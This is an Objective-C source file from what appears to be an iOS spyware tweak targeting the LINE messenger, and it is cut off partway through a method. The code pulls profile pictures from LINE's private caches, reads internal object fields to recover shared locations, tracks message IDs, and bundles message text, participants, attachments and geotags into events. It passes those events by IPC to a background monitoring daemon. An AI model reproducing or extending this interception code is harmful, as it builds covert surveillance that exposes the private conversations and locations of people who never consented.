//
//  LINEUtils.m
//  MSFSP
//
//  Created by Makara Khloth on 11/27/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <objc/runtime.h>

#import "LINEUtils.h"
#import "IMShareUtils.h"

#import "LineLocation.h"
#import "TalkUserObject.h"
#import "TalkImageCacheManager.h"
#import "TalkUserDefaultManager.h"
#import "TalkUtil.h"
#import "ContactModel.h"
#import "NLAudioURLLoader.h"

#import "DefStd.h"
#import "FxIMEvent.h"
#import "FxVoIPEvent.h"
#import "FxRecipient.h"
#import "FxIMGeoTag.h"
#import "FxAttachment.h"
#import "FxEventEnums.h"
#import "MessagePortIPCSender.h"
#import "SharedFile2IPCSender.h"
#import "StringUtils.h"
#import "DaemonPrivateHome.h"
#import "DateTimeFormat.h"

#import "LINEEventSenderOperation.h"
#import "LINE-Structs.h"

#import "VideoDownloadOperation.h"

static LINEUtils *_LINEUtils = nil;



// image filename will be user id
static NSString * const kLineImageProfilePath		= @"Caches/Profile/os.line.naver.jp/80/os/p/";

// image filename will be in the folder named 'USER_ID'. The image name is preview
static NSString * const kLineImagePreviewPath		= @"Caches/Profile/Preview/os.line.naver.jp/80/os/p/";

// sticker package will be in the below format
// e.g., 2.100.linestk
//		2	:	package id
//		100	:	version
static NSString * const kLineDownloadedStickerPath	= @"Application Support/Sticker Packages";

static NSString * const kLineIncomingStickerPath	= @"Caches/Stray Sticker Packages";

static NSString * const kLineMessageAttachmentPath	= @"Application Support/Message Attachment";

static NSString * const kLineSmallProfileImagePath	= @"Profile Images";

static NSString * const kLineBigProfileImagePath	= @"tmp/Profile Image Uploads";


// key
static NSString * const kVideoDownloadOPUserID              = @"videoDownloadOPUserID";
static NSString * const kVideoDownloadOPUserName            = @"videoDownloadOPUserName";
static NSString * const kVideoDownloadOPUserStatusMessage	= @"videoDownloadOPUserStatusMessage";
static NSString * const kVideoDownloadOPUserPic             = @"videoDownloadOPUserPic";
static NSString * const kVideoDownloadOPConverID            = @"videoDownloadOPConverID";
static NSString * const kVideoDownloadOPConverName          = @"videoDownloadOPConverName";
static NSString * const kVideoDownloadOPConverPic           = @"videoDownloadOPConverPic";
static NSString * const kVideoDownloadOPParticipants        = @"videoDownloadOPParticipants";

#define kAudioDownloadDelay							10
#define kMaxLineMessageIDCount						100

@interface LINEUtils (private)

//- (void) thread: (FxIMEvent *) aIMEvent;

// Photo Attachment
+ (FxAttachment *)	createPhotoAttachment: (NSData *) aImageData thumbnail: (NSData *) aThumbnailData;
+ (NSString *)		createTimeStamp;
+ (NSString *)		getOutputPath: (NSString *) aOutputPathWithoutExtension 
						extension: (NSString *) aExtension;

// Audio/Video Attachment
+ (FxAttachment *)	createAudioVideoAttachmentForData: (NSData *) aAudioData 
									   fileExtension: (NSString *) aExtension;

// Audio
+ (void)				sendLINEInfo: (NSDictionary *) aLineInfo;

// Sticker
+ (NSString *)		findStickerFolderNameForStickerPackageID: (NSString *) aStickerPackageID stickerPackagesPath: (NSString *) aStickerPackagesPath;
+ (NSString *)		getStickerFolderPathForPackageIDIfExist: (NSString *) aStickerPackageID;
+ (NSData *)			getStickerDataForStickerID: (NSInteger) aStickerID
							stickerPackageID: (NSString *) aStickerPackageID
							stickerPackageVersion: (unsigned) aStickerPackageVersion;
+ (FxAttachment *)	createStickerAttachment: (NSData *) aStickerData;

// picture profile
+ (NSString *)		getProfilePicturePathForLINE37WithLastDirectoryComponent: (NSString *) aLastDirectoryComponent;

// Contact 

//+ (NSString *) createVCardStringForLINEName: (NSString *) aLINEName
//									 lineID: (NSString *) aLINEID;

- (void)				addOperationWithIMEvent: (FxIMEvent *) aIMEvent;

- (void)				voIPthread: (FxVoIPEvent *) aVoIPEvent;					// for VoIP only
+ (BOOL)				sendDataToPort: (NSData *) aData portName: (NSString *) aPortName;

@end


@implementation LINEUtils

@synthesize mLineEventSenderQueue;
@synthesize mLineVideoDownloadQueue;
@synthesize mOutgoingMessageDictionary;
@synthesize mOutgoingMessageArray;
@synthesize mOutgoingMessageObjectArray;

@synthesize mIMSharedFileSender, mVOIPSharedFileSender;

+ (LINEUtils *) shareLINEUtils {
	if (_LINEUtils == nil) {
		_LINEUtils = [[LINEUtils alloc] init];	
		
		// -- create NSOperation queue for sending part		
		NSOperationQueue *queue = [[NSOperationQueue alloc] init];
		[queue setMaxConcurrentOperationCount:1];				
		[_LINEUtils setMLineEventSenderQueue:queue];								// set event sender queue
		[queue release];
		queue = nil;
        
        // -- create NSOperation queue for sending part
		NSOperationQueue *videoDownloadQueue = [[NSOperationQueue alloc] init];
		[videoDownloadQueue setMaxConcurrentOperationCount:1];
		[_LINEUtils setMLineVideoDownloadQueue:videoDownloadQueue];								// set event sender queue
		[videoDownloadQueue release];
		videoDownloadQueue = nil;
		
		// -- initiate history Line MessageID array
		NSMutableArray *historyMessageIDArray = [[NSMutableArray alloc] init];
		[_LINEUtils setMOutgoingMessageArray:historyMessageIDArray];				// set history of message array
		[historyMessageIDArray release];
		historyMessageIDArray = nil;
		
		// -- initiate history Line MessageID dictionary
		NSMutableDictionary *historyMessageIDDictionary = [[NSMutableDictionary alloc] init];
		[_LINEUtils setMOutgoingMessageDictionary:historyMessageIDDictionary];		// set history of message and timestamp dictionary
		[historyMessageIDDictionary release];
		historyMessageIDDictionary = nil;
		
		// -- initiate history Line MessageObject array
		NSMutableArray *historyMessageObjArray = [[NSMutableArray alloc] init];
		[_LINEUtils setMOutgoingMessageObjectArray:historyMessageObjArray];				// set history of message array
		[historyMessageObjArray release];
		historyMessageObjArray = nil;
		
		if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
			SharedFile2IPCSender *sharedFileSender = nil;
			
			sharedFileSender = [[SharedFile2IPCSender alloc] initWithSharedFileName:kLINEMessagePort1];
			[_LINEUtils setMIMSharedFileSender:sharedFileSender];
			[sharedFileSender release];
			sharedFileSender = nil;
			
			sharedFileSender = [[SharedFile2IPCSender alloc] initWithSharedFileName:kLINECallLogMessagePort1];
			[_LINEUtils setMVOIPSharedFileSender:sharedFileSender];
			[sharedFileSender release];
			sharedFileSender = nil;
		}
	}
	return (_LINEUtils);
}

- (void) addOperationWithIMEvent: (FxIMEvent *) aIMEvent {
	DLog (@"=====> background thread %@ priority %f", [NSThread currentThread], [NSThread threadPriority])
	NSOperationQueue *queue			= [[LINEUtils shareLINEUtils] mLineEventSenderQueue];	
	LINEEventSenderOperation *op	= [[LINEEventSenderOperation alloc] initWithIMEvent:aIMEvent];
	[queue addOperation:op];
	[op release];
	op = nil;
}

+ (void) sendLINEEvent: (FxIMEvent *) aIMEvent {

	/* -------------------------------------------------------------
		This is not used because message port cannot process in time.
		Some event are lost because it doesn't arrive the Daemon
	 --------------------------------------------------------------*/
	//	LINEUtils *lineUtils = [[LINEUtils alloc] init];	
	//	[NSThread detachNewThreadSelector:@selector(thread:)
	//							 toTarget:lineUtils withObject:aIMEvent];	
	//	[lineUtils autorelease];
	DLog (@"=====> line thread %@ priority %f", [NSThread currentThread], [NSThread  threadPriority])
	[[LINEUtils shareLINEUtils] performSelectorInBackground:@selector(addOperationWithIMEvent:) withObject:aIMEvent];
	
}

+ (NSString *) getProfilePicturePathForLINE37WithLastDirectoryComponent: (NSString *) aLastDirectoryComponent {	
	NSArray *libraryPaths			= NSSearchPathForDirectoriesInDomains(NSCachesDirectory, NSUserDomainMask, YES);
	NSString *profileImagePath		= nil;
	
	if (libraryPaths								&& 
		[libraryPaths objectAtIndex:0]				&&	
		aLastDirectoryComponent						){
		
		profileImagePath			= [libraryPaths objectAtIndex:0];													// --> /Library/Caches
		profileImagePath			= [profileImagePath stringByAppendingPathComponent:kLineSmallProfileImagePath];		// --> /Library/Caches/Profile Images			
		profileImagePath			= [profileImagePath stringByAppendingPathComponent:aLastDirectoryComponent];		// --> /Library/Caches/Profile Images/0m07e2d33c72517e8c4e5e7ee1a634be3f3f159fc1697e
		profileImagePath			= [profileImagePath stringByAppendingPathComponent:@"200x200.jpg"];					// --> /Library/Caches/Profile Images/0m07e2d33c72517e8c4e5e7ee1a634be3f3f159fc1697e/200x200.jpg	
		
		DLog (@"full path to profile directory %@", profileImagePath)				
	}
    
    // LINE 5.1.0 & 5.1.1 store profile image in shared app group
    NSFileManager *fileManager = [NSFileManager defaultManager];
    if (aLastDirectoryComponent &&
        ![fileManager fileExistsAtPath:profileImagePath]) {
        NSURL *url = [fileManager containerURLForSecurityApplicationGroupIdentifier:@"group.com.linecorp.line"];
        DLog(@"url c, %@", url);                                                                                        // file:///private/var/mobile/Containers/Shared/AppGroup/C310A3BE-CFAD-47BA-9661-CFED604ED563/
        
        profileImagePath = [url path];                                                                                  // /private/var/mobile/Containers/Shared/AppGroup/C310A3BE-CFAD-47BA-9661-CFED604ED563
        profileImagePath = [profileImagePath stringByAppendingString:@"/Library/Caches/Profile Images/"];
        profileImagePath = [profileImagePath stringByAppendingString:aLastDirectoryComponent];
        profileImagePath = [profileImagePath stringByAppendingString:@"/200x200.jpg"];
        
        DLog (@"Full path to profile picture in shared AppGroup %@", profileImagePath)
    }
    
	return profileImagePath;
}

//+ (UIImage *) imageWithImage: (UIImage *) image scaledToSize: (CGSize) newSize {
//    //UIGraphicsBeginImageContext(newSize);
//    UIGraphicsBeginImageContextWithOptions(newSize, NO, 0.0);
//    [image drawInRect:CGRectMake(0, 0, newSize.width, newSize.height)];
//    UIImage *newImage = UIGraphicsGetImageFromCurrentImageContext();    
//    UIGraphicsEndImageContext();
//    return newImage;
//}

+ (FxRecipient *) createFxRecipientWithTalkUserObject: (TalkUserObject *) aTalkUserObject {
	FxRecipient *participant = [LINEUtils createFxRecipientWithMID:[aTalkUserObject mid]
															  name:[aTalkUserObject displayUserName]
													 statusMessage:[aTalkUserObject statusMessage]];
		
	// -- Find contact picture profile if not exist yet for LINE version 3.7
	if (![participant mPicture]						||
		[[participant mPicture] length] == 0		){				
		NSData *imageData = [LINEUtils getPictureProfileWithTalkUserObject:aTalkUserObject];
		if (imageData) {
			DLog (@">>>> Contact Picture Profile length %lu", (unsigned long)[imageData length])
			[participant setMPicture:imageData];								// set Contact Picture Profile
		}
	}			
	return participant;
}

+ (FxRecipient *) createFxRecipientWithMID: (NSString *) aMID
									  name: (NSString *) aName
							 statusMessage: (NSString *) aStatusMessage {
	NSData *imageProfileData = [[NSData alloc] initWithData:[LINEUtils getContactPictureProfile:aMID]];		
	FxRecipient *participant = [LINEUtils createFxRecipientWithMID:aMID
															  name:aName
													 statusMessage:aStatusMessage
												  imageProfileData:imageProfileData];	
	[imageProfileData release];	
	return participant;
}

+ (FxRecipient *) createFxRecipientWithMID: (NSString *) aMID
									  name: (NSString *) aName
							 statusMessage: (NSString *) aStatusMessage 
						  imageProfileData: (NSData *) aImageProfileData {
	FxRecipient *participant = [[FxRecipient alloc] init];			
	[participant setRecipNumAddr:aMID];		
	[participant setRecipContactName:aName];		
	[participant setMStatusMessage:aStatusMessage];	
	[participant setMPicture:aImageProfileData];
	DLog (@"recipient number/id %@", aMID)				
	DLog (@"recipient name %@", aName)
	DLog (@"status message: %@", aStatusMessage)
	DLog (@"aImageProfileData: %lu", (unsigned long)[aImageProfileData length])
	return [participant autorelease];
}

/*
+ (BOOL) isLineVersionIsEqualOrGreaterThan: (float) aVersion {
	NSString *bundleVersionString =  [[NSBundle mainBundle] objectForInfoDictionaryKey:(NSString *)kCFBundleVersionKey];	// e.g, 3.5.0, 3.2.1	
	// get first 2 digig
	NSArray *versionComponent = [bundleVersionString componentsSeparatedByString:@"."];
	NSString *twoDigitVersionString = [[NSString alloc] initWithFormat:@"%@.%@", [versionComponent objectAtIndex:0], [versionComponent objectAtIndex:1]];
	
	// compare with float aVersion
	float twoDigitVersionFloat = [twoDigitVersionString floatValue];
	DLog (@"LINE version %f", twoDigitVersionFloat)


	return (twoDigitVersionFloat >= aVersion) ? YES : NO;
}
 */

+ (FxIMGeoTag *) getIMGeoTax: (LineLocation *) aLineLocation {	
	FxIMGeoTag *imGeoTag = nil;
	
	BOOL shoudProcess = NO;
	if ([aLineLocation respondsToSelector:@selector(longitudeIsSet)]		&&
		[aLineLocation respondsToSelector:@selector(latitudeIsSet)])			{
		
		if ([aLineLocation longitudeIsSet]	&&	[aLineLocation latitudeIsSet])
			shoudProcess	= YES;
	} else {		// version 3.10.0
		Ivar iv					= object_getInstanceVariable(aLineLocation, "__isSet", NULL);
		ptrdiff_t offset		= ivar_getOffset(iv);
		XXStruct_JTAGoB isSetStruct = *(XXStruct_JTAGoB *)((char *)aLineLocation + offset);
		DLog (@"1 latitude is set: %d", isSetStruct.latitude)
		DLog (@"2 longitude is set %d", isSetStruct.longitude)
		if (isSetStruct.latitude			&&	isSetStruct.longitude)
			shoudProcess	= YES;		
	}
				
	
	if (aLineLocation					&& 
		shoudProcess) {
//		[aLineLocation longitudeIsSet]	&&
//		[aLineLocation latitudeIsSet]	){
		
		float hor				= -1;			
		NSString *locationPlace	= [[NSString alloc] initWithString:[aLineLocation title]];				
		if ([locationPlace isEqualToString: @"Location"]) {
			[locationPlace release];
			locationPlace = [[NSString alloc] initWithString:[aLineLocation address]];
		}		
		
		imGeoTag				= [[FxIMGeoTag alloc] init];			
		[imGeoTag setMLatitude:(float)[aLineLocation latitude]];
		[imGeoTag setMLongitude:(float)[aLineLocation longitude]];			
		[imGeoTag setMHorAccuracy:hor];	// default value when cannot get information	
		[imGeoTag setMPlaceName:locationPlace];
		
		DLog (@"imGeoTag %@", imGeoTag)
				
		[locationPlace release];			
	}
	return [imGeoTag autorelease];
}

+ (NSData *) getPictureProfileWithTalkUserObject: (TalkUserObject *) aTalkUserObject {
	//DLog (@">>>> contact picture profile for LINE version 3.7")
	NSString *lineProfilePicturePath	= [aTalkUserObject picturePath];	// e.g., /0m07e2d33c72517e8c4e5e7ee1a634be3f3f159fc1697e												
	lineProfilePicturePath				= [LINEUtils getProfilePicturePathForLINE37WithLastDirectoryComponent:lineProfilePicturePath];
	DLog (@"lineProfilePicturePath %@",		lineProfilePicturePath)	
	NSData *imageData = nil;	
	if ([[NSFileManager defaultManager] fileExistsAtPath:lineProfilePicturePath]) {		// -- Actual picture proflie exists, so use it					
		imageData				= [[NSData alloc] initWithContentsOfFile:lineProfilePicturePath];
		DLog (@">>>> Contact Picture Profile length %lu", (unsigned long)[imageData length])
		
	}						
	return [imageData autorelease];
}
+ (NSData *) getContactPictureProfile: (NSString *) aContactMID {
	NSData *imageData = nil;
	
	// -- search in the part of actual image profile.
	// -- if not exist, search in the part of preview image profile
	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);	
	if ([paths count] == 1) {
		
		NSString *actualPicturePath			= [[paths objectAtIndex:0] stringByAppendingPathComponent:kLineImageProfilePath];
		actualPicturePath					= [actualPicturePath stringByAppendingPathComponent:aContactMID];	
		DLog (@"path 2 %@", actualPicturePath)
		NSFileManager *fileManager			= [[NSFileManager alloc] init];
		
		if ([fileManager fileExistsAtPath:actualPicturePath]) {		// -- Actual picture proflie exists, so use it
			DLog (@">>> Actual Image profile")
			
			imageData						= [[NSData alloc] initWithContentsOfFile:actualPicturePath];	// Note that the actual contact image profile will be existed only when the user open their image profile			
			//[imageData writeToFile:@"/tmp/out1.jpg" atomically:0];
		} else {													// -- use preview picture profile instead
			DLog (@">>> Preview Image profile")
			NSString *previewPicturePath	=  [[paths objectAtIndex:0] stringByAppendingPathComponent:kLineImagePreviewPath];
			previewPicturePath				= [previewPicturePath stringByAppendingPathComponent:aContactMID];
			previewPicturePath				= [previewPicturePath stringByAppendingPathComponent:@"preview"];
			DLog (@"path 2 %@", previewPicturePath)			
			if ([fileManager fileExistsAtPath:previewPicturePath]) {
				imageData					= [[NSData alloc] initWithContentsOfFile:previewPicturePath];			
				//[imageData writeToFile:@"/tmp/out2.jpg" atomically:0];
			}
		}						
		[fileManager release];		
	}		
	return [imageData autorelease];
}

+ (NSData *) getOwnerPictureProfile: (NSString *) aOwnerUID {
	Class $TalkImageCacheManager	= objc_getClass("TalkImageCacheManager");
	Class $TalkUserDefaultManager	= objc_getClass("TalkUserDefaultManager");
	Class $TalkUtil					= objc_getClass("TalkUtil");
					
	UIImage *image					= nil;
	
	if ([[$TalkUserDefaultManager class] respondsToSelector:@selector(profileImage)]) {
		DLog (@">>> LINE 3.6.5")
		image					= [[$TalkImageCacheManager sharedManager] imageForURL:[$TalkUserDefaultManager profileImage]];	
	} else if ([[$TalkUserDefaultManager class] respondsToSelector:@selector(profilePicturePath)]) {		
		DLog (@">>>> LINE 3.7.0 UP")
		
		// -------------------------------------------------
		// -- CASE 1: Find owner profile image from /Library
		// -------------------------------------------------
		
		// profilePicturePath can be null if the profile image is not set by the owner		
		NSString *lineProfilePicturePath	= [$TalkUserDefaultManager profilePicturePath];	// e.g., /0m07e6ca9f7251589d6b080faf3c015b43f1d9d847e966				
		DLog (@"lineProfilePicturePath %@", lineProfilePicturePath)	

		NSString *profileImagePath			= [LINEUtils getProfilePicturePathForLINE37WithLastDirectoryComponent:lineProfilePicturePath];
		DLog (@"owner image profile path %@", profileImagePath)
		
		if ([[NSFileManager defaultManager] fileExistsAtPath:profileImagePath])
			image	= [UIImage imageWithContentsOfFile:profileImagePath];
		else
			DLog (@"Profile Image File does not exist");
					
		// -------------------------------------------------		
		// -- CASE 2: Find owner profile image from /tmp		
		// -------------------------------------------------
		
		if (!image) {	
			NSArray *tmpPaths				= NSSearchPathForDirectoriesInDomains(NSApplicationDirectory, NSUserDomainMask, YES);	
			DLog (@"tmpPaths %@", tmpPaths)
			
			if (tmpPaths					&& 
				[tmpPaths objectAtIndex:0]	){					
				NSString *profileImagePath	= [tmpPaths objectAtIndex:0];														// --> /				
				profileImagePath			= [profileImagePath stringByAppendingPathComponent:kLineBigProfileImagePath];	// --> /tmp/Profile Image Uploads
				profileImagePath			= [profileImagePath stringByAppendingPathComponent:aOwnerUID];					// --> /tmp/Profile Image Uploads/u1df23a53428870145f50ad8f8b1ffe14
				DLog (@"full path to owner profile directory %@", profileImagePath)
				
				if ([[NSFileManager defaultManager] fileExistsAtPath:profileImagePath])
					image					= [UIImage imageWithContentsOfFile:profileImagePath];
				else
					DLog (@"Profile Image File does not exist");	

			}					
		}
	} 
		
	NSData *imageData				= nil;
	DLog (@"image %@", image)

	if (image) {
		DLog (@">>> Getting owner profile case 1")
		UIImage *resizedImage		= [$TalkUtil resizeImage:image to:CGSizeMake(image.size.width/2, image.size.height/2)];
		imageData					= UIImageJPEGRepresentation(resizedImage, 0);	
		//DLog (@"imageData %@", imageData)
		//DLog (@"[$TalkUserDefaultManager profileImage]] %@", [$TalkUserDefaultManager profileImage])
		//[UIImageJPEGRepresentation(image, 0) writeToFile:@"/tmp/actualOwnerPicture.jpg" atomically:0];
		//[imageData writeToFile:@"/tmp/resizedOwnerPicture.jpg" atomically:0];
	} else {
		DLog (@">>> Getting owner profile case 2")
		imageData					= [LINEUtils getContactPictureProfile: aOwnerUID];
	}	
	return imageData;	
}

+ (BOOL) isUnSupportedContentType: (LineContentType) aLineContentType {
    DLog(@"line content type %d", aLineContentType)
	BOOL isUnSupported = NO;
	if (//aLineContentType == kLINEContentTypeImage				||
		//aLineContentType == kLINEContentTypeVideo				||	
		//aLineContentType == kLINEContentTypeAudioMessage		||	
		aLineContentType == kLINEContentTypeCall				//||	/// TODO: call
		//aLineContentType == kLINEContentTypeSticker			||
		//aLineContentType == kLINEContentTypeContact				
		){
		isUnSupported = YES;
	}
	return isUnSupported;
}		

// Assign conversation profile picture to be contact profile picture in the case of individual conversation
+ (BOOL) isIndividualConversationForChatType: (NSNumber *) aChatType participants: (NSArray *) aParticipants {
	BOOL isIndividualConversation = NO;
	DLog (@"chat type (0:ind 1:many 2:group) : %@", aChatType )		
	if ([aChatType intValue] == 0		&&					// for individual
		[aParticipants count] != 0		){
		DLog (@">> assign conversation picture")
		isIndividualConversation = YES;
	}
	return isIndividualConversation;	
}
 

/***********************************************
	Store the message id of outgoing text message
 ***********************************************/
+ (void) storeMessageID: (id) aMessageID {	
	
	// -- check first if the message id exist or not	
	NSMutableArray *historyMessageIDArray = [[LINEUtils shareLINEUtils] mOutgoingMessageArray];		
	
	// -- message id doesn't exist
	if (![historyMessageIDArray containsObject:aMessageID]) {
		DLog (@"LINE NOT duplicated: %@", aMessageID)
		
		NSMutableDictionary *historyMessageIDDictionary		= [[LINEUtils shareLINEUtils] mOutgoingMessageDictionary];

		DLog (@"store: -- Before adding LINE message id into dictionary %@",	historyMessageIDDictionary)		
		DLog (@"store: -- Before adding LINE message id into array %@",			historyMessageIDArray)		
		
		// -- Remove history if the number of message reach max
		if ([historyMessageIDArray count] >= kMaxLineMessageIDCount) {
			
			// -- remove the oldest message id from the array and dictionary that keep its timestamp			
			NSString *oldestMessageID = [historyMessageIDArray objectAtIndex:0];
			DLog (@"store: remove oldest message id %@", oldestMessageID)
			
			[historyMessageIDDictionary removeObjectForKey:oldestMessageID];					// remove from dictionary
			[historyMessageIDArray removeObject:oldestMessageID];								// remove from array
			
			DLog (@"store: Dictionary AFTER remove oldest message: %@",	historyMessageIDDictionary)			
			DLog (@"store: Array AFTER remove oldest message: %@",			historyMessageIDArray)
					
		}							
		
		// -- Add the latest message id
		[historyMessageIDDictionary setObject:[NSNumber numberWithLongLong:0] forKey:aMessageID];	// add to dictionary
		[historyMessageIDArray addObject:aMessageID];												// add to array
	
		
		DLog (@"store: dictionary after add: %@", historyMessageIDDictionary)			
		DLog (@"store: array after add: %@", historyMessageIDArray)
	} else {
		DLog (@"Not store this ID. It already exists")
	}
}

+ (void) storeMessageObject : (id) aMessageObject {
	NSMutableArray *historyMessageObjArray = [[LINEUtils shareLINEUtils] mOutgoingMessageObjectArray];
	DLog (@"store: -- Before adding LINE message object into array %@", historyMessageObjArray)
	
	// -- message doesn't exist
	if (![historyMessageObjArray containsObject:aMessageObject]) {
		
		// -- Remove history if the number of message reach max
		if ([historyMessageObjArray count] >= kMaxLineMessageIDCount) {
								
			// -- Get oldest message object 
			id oldestMessageObject = [historyMessageObjArray objectAtIndex:0];
			
			DLog (@"store: remove oldest message object %@", oldestMessageObject)
			[historyMessageObjArray removeObject:oldestMessageObject];							// remove from array			
		}
		[historyMessageObjArray addObject:aMessageObject];										// add to array
						
		DLog (@"store: array after add: %@", historyMessageObjArray)
		
	}
		
}

/***********************************************
	Update timestamp for existing message id
 ***********************************************/
+ (void) addTimestamp: (NSNumber *) aTimestamp
	existingMessageID: (NSString *) aMessageID {
	
	DLog (@"addTS: add timestamp")
	// -- check first if the message id exist or not	
	NSMutableArray *historyMessageIDArray				= [[LINEUtils shareLINEUtils] mOutgoingMessageArray];		
	NSMutableDictionary *historyMessageIDDictionary		= [[LINEUtils shareLINEUtils] mOutgoingMessageDictionary];
	
	DLog (@"addTS: dictionary BEFORE: %@", historyMessageIDDictionary)
	// update timestamp for the message id
	if ([historyMessageIDArray containsObject:aMessageID]) {
		DLog (@"addTS: update TS: %@ for message id %@", aTimestamp, aMessageID)
		[historyMessageIDDictionary setObject:aTimestamp forKey:aMessageID]; 
			
	}
	DLog (@"addTS: dictionary AFTER: %@", historyMessageIDDictionary)
}


/***********************************************
	Check if the timestamp is already exist or not.
	We use timestamp of the message to identify if the message is duplicated or not
 ***********************************************/
+ (BOOL) isDuplicatedMessageWithTimestamp: (NSNumber *) aTimestamp {
	
	BOOL isDuplicated = NO;	
	
	NSMutableDictionary *historyMessageIDDictionary		= [[LINEUtils shareLINEUtils] mOutgoingMessageDictionary];
	NSMutableArray *historyMessageIDArray				= [[LINEUtils shareLINEUtils] mOutgoingMessageArray];	
	
	NSArray *timestampArray = [historyMessageIDDictionary allValues];
	DLog (@"isDup: timestampArray %@", timestampArray)						// Note that it is not ordered

	// -- check if timestamp exists or not
	// CASE: Duplicated TS
	if ([timestampArray containsObject:aTimestamp]) {	
		DLog (@"!!!!!!!!!!! LINE DUPLICATE !!!!!!!!!!!")
		isDuplicated = YES;

		
		NSArray *allMessageIDForTimestamp = [historyMessageIDDictionary allKeysForObject:aTimestamp];
		
		DLog (@"isDup: allMessageIDForTimestamp %@", allMessageIDForTimestamp)
		NSString *duplicatedMessageID = [allMessageIDForTimestamp objectAtIndex:0];
		DLog (@"isDup: LINE duplicated: %@", duplicatedMessageID)
		
		// -- remove the duplicated message id for array history and dictionary history
		[historyMessageIDDictionary removeObjectForKey:duplicatedMessageID];					// remove from dictionary
		[historyMessageIDArray removeObject:duplicatedMessageID];								// remove from array
		
		DLog (@"isDup: dictionary AFTER remove DUP: %@", historyMessageIDDictionary)			
		DLog (@"isDup: array AFTER remove DUP: %@", historyMessageIDArray)		
	}
	// CASE: Not duplicate TS
	else {		
		DLog (@"!!!!!!!!!!! LINE NOT DUPLICATE !!!!!!!!!!! (ts: %@)", aTimestamp)
		isDuplicated = NO;
	}
		
	return isDuplicated;
}


/***********************************************
 Check if the message object is already exist or not.
 ***********************************************/
+ (BOOL) isDuplicatedMessageObject: (id) aMessageObject {
	
	BOOL isDuplicated = NO;	
	
	NSMutableArray *historyMessageObjArray				= [[LINEUtils shareLINEUtils] mOutgoingMessageObjectArray];			
	DLog (@"isDup: historyMessageObjArray %@", historyMessageObjArray)						// Note that it is not ordered
	
	// -- check if message object exists or not
	// CASE: Duplicated
	if ([historyMessageObjArray containsObject:aMessageObject]) {	
		DLog (@"!!!!!!!!!!! LINE DUPLICATE !!!!!!!!!!!")
		isDuplicated = YES;				
		DLog (@"isDup: LINE duplicated: %@", aMessageObject)	
		[historyMessageObjArray removeObject:aMessageObject];									// remove from array	
		DLog (@"isDup: array AFTER remove DUP: %@", historyMessageObjArray)		
	}
	// CASE: Not duplicate
	else {		
		DLog (@"!!!!!!!!!!! LINE NOT DUPLICATE !!!!!!!!!!! (MessageObject: %@)", aMessageObject)
		isDuplicated = NO;
	}	
	return isDuplicated;
}


#pragma mark -
#pragma mark IM event sending
#pragma mark -


#pragma mark Any Content Type


+ (void) sendAnyContentTypeEventUserID: (NSString *) aUserID						// user id
					   userDisplayName: (NSString *) aUserDisplayName				// user display name
					 userStatusMessage: (NSString *) aUserStatusMessage				// user status message
				userProfilePictureData: (NSData *) aUserProfilePictureData			// user profile picture
						  userLocation: (FxIMGeoTag *) aUserLocation

				 messageRepresentation: (FxIMMessageRepresentation) aMessageRepresentation
							   message: (NSString *) aMessage
							 direction: (FxEventDirection) aDirection				// direction

						conversationID: (NSString *) aConversationID				// conversation id
					  conversationName: (NSString *) aConversationName				// conversation name
			conversationProfilePicture: (NSData *) aConversationProfilePicture		// conversation profile pic

						  participants: (NSArray *) aParticipants														

						   attachments: (NSArray *) aAttachments

						 shareLocation: (FxIMGeoTag *) aSharedLocation {		
	NSString *imServiceId				= @"lin";	
	
	/********************************
	 *			FxIMEvent [ANY]
	 ********************************/

	FxIMEvent *imEvent			= [[FxIMEvent alloc] init];
	[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];	
	
	[imEvent setMIMServiceID:imServiceId];						// specific to IM application
	[imEvent setMServiceID:kIMServiceLINE];						// specific to IM application
	
	[imEvent setMDirection:(FxEventDirection) aDirection];
	[imEvent setMRepresentationOfMessage:aMessageRepresentation];		
	[imEvent setMMessage:aMessage];										
	// -- user
	[imEvent setMUserID:aUserID];
	[imEvent setMUserDisplayName:aUserDisplayName];
	[imEvent setMUserStatusMessage:aUserStatusMessage];
	[imEvent setMUserPicture:aUserProfilePictureData];
	[imEvent setMUserLocation:aUserLocation];
	// -- conversation
	[imEvent setMConversationID:aConversationID];
	[imEvent setMConversationName:aConversationName];
	[imEvent setMConversationPicture:aConversationProfilePicture];		
	// -- participant
	[imEvent setMParticipants:aParticipants];
	// -- attachment
	[imEvent setMAttachments:aAttachments];	
	// -- share location	
	[imEvent setMShareLocation:aSharedLocation];	
	
	[LINEUtils sendLINEEvent:imEvent];
	[imEvent release];	
}


#pragma mark Image


+ (void) sendImageContentTypeEventUserID: (NSString *) aUserID						// user id
						 userDisplayName: (NSString *) aUserDisplayName				// user display name
					   userStatusMessage: (NSString *) aUserStatusMessage			// user status message
				  userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

							   direction: (FxEventDirection) aDirection				// direction
						
						  conversationID: (NSString *) aConversationID				// conversation id
						conversationName: (NSString *) aConversationName			// conversation name
			  conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

							participants: (NSArray *) aParticipants														

							   photoData: (NSData *) aPhotoData
						   thumbnailData: (NSData *) aThumbnailData {
	NSAutoreleasePool *pool		= [[NSAutoreleasePool alloc] init];

	FxAttachment *attachment	= [LINEUtils createPhotoAttachment:aPhotoData thumbnail: aThumbnailData];

	NSArray *attachments		= [[NSArray alloc] initWithObjects:attachment, nil];

	[pool drain];
		
	/********************************
	 *			FxIMEvent [Image]
	 ********************************/

	[LINEUtils sendAnyContentTypeEventUserID:aUserID
							 userDisplayName:aUserDisplayName 
						   userStatusMessage:aUserStatusMessage
					  userProfilePictureData:aUserProfilePictureData 
								userLocation:nil 
					   messageRepresentation:kIMMessageNone								
									 message:nil										// No message for image
								   direction:aDirection 
							  conversationID:aConversationID 
							conversationName:aConversationName 
				  conversationProfilePicture:aConversationProfilePicture 
								participants:aParticipants 
								 attachments:attachments
							   shareLocation:nil];					// one photo as an attachment
	[attachments release];
	attachments = nil;
}


+ (void) sendImageContentTypeEventUserID: (NSString *) aUserID						// user id
						 userDisplayName: (NSString *) aUserDisplayName				// user display name
					   userStatusMessage: (NSString *) aUserStatusMessage			// user status message
				  userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

							   direction: (FxEventDirection) aDirection				// direction

						  conversationID: (NSString *) aConversationID				// conversation id
						conversationName: (NSString *) aConversationName			// conversation name
